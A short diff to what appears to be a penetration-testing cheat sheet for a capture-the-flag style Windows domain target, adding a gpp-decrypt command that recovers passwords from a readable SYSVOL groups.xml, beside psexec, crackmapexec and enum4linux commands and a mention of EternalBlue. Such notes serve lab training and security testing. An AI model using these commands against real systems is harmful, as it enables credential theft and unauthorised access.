@@ -166,6 +166,7 @@ psexec.py -dc-ip [IP_ADDR] active.htb/administrator:[PASSWORD]@[IP_ADDR] cmd  # 
 crackmapexec smb [IP_ADDR] --shares
 crackmapexec smb [IP_ADDR] -d [domain] -u [USERNAME] -p [PASSWORD] --shares   # can be use for bruteforcing too
 enum4linux -a [IP_ADDR]
+gpp-decrypt "[cpassword]"   # with sysvol groups.xml readable
 ```
 
 MS17-010 EternalBlue exploitation for SMBv1 in Windows Vista, 7, 8.1, 10; Server 2008, 2012, 2016 SMB share folder mounting
